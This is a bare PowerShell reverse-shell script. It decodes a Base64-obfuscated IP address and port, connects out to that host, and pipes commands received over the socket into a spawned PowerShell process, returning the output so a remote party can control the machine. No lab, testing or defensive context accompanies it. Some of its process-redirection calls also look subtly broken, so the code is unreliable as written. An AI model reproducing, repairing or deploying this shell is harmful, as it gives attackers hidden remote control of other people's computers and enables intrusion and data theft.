# Decode IP address from Base64
$ipBytes = [System.Convert]::FromBase64String("MTcyLjIyLjIzOC4xNjg=")
$ip = [System.Text.Encoding]::ASCII.GetString($ipBytes)

# Decode port from Base64
$portBytes = [System.Convert]::FromBase64String("NDQ0NQ==")
$portStr = [System.Text.Encoding]::ASCII.GetString($portBytes)
$port = [int]$portStr

try {
    # Create TCP client and connect
    $tcpClient = New-Object System.Net.Sockets.TCPClient($ip, $port)
    $stream = $tcpClient.GetStream()
    $reader = New-Object System.IO.StreamReader($stream)
    $writer = New-Object System.IO.StreamWriter($stream)
    $writer.AutoFlush = $true

    # Start the PowerShell process with redirected streams
    $process = Start-Process -FilePath "powershell.exe" -NoNewWindow -PassThru -RedirectStandardInput -RedirectStandardOutput -RedirectStandardError

    # Get the StreamWriter for the process's standard input
    $inputStream = $process.StandardInput.BaseStream
    $inputWriter = New-Object System.IO.StreamWriter($inputStream)
    $inputWriter.AutoFlush = $true

    # Loop to handle commands and output
    while ($tcpClient.Connected -and -not $process.HasExited) {
        # Read command from network client
        $command = $reader.ReadLine()
        if ($command -eq $null) {
            break
        }

        # Send command to the PowerShell process
        $inputWriter.WriteLine($command)
        $inputWriter.Flush()

        # Collect output from the process
        $output = @()
        while ($process.StandardOutput.BaseStream.DataAvailable) {
            $outputLine = $process.StandardOutput.ReadLine()
            if ($outputLine -ne $null) {
                $output += $outputLine
            }
        }

        # Send collected output back to the client
        $writer.WriteLine(($output -join "`n"))
        $writer.Flush()
    }

    # Cleanup resources
    $inputWriter.Dispose()
    $writer.Dispose()
    $reader.Dispose()
    $stream.Dispose()
    $tcpClient.Dispose()
    $process.WaitForExit()
    $process.Dispose()
}
catch {
    Write-Error "An error occurred: $_"
}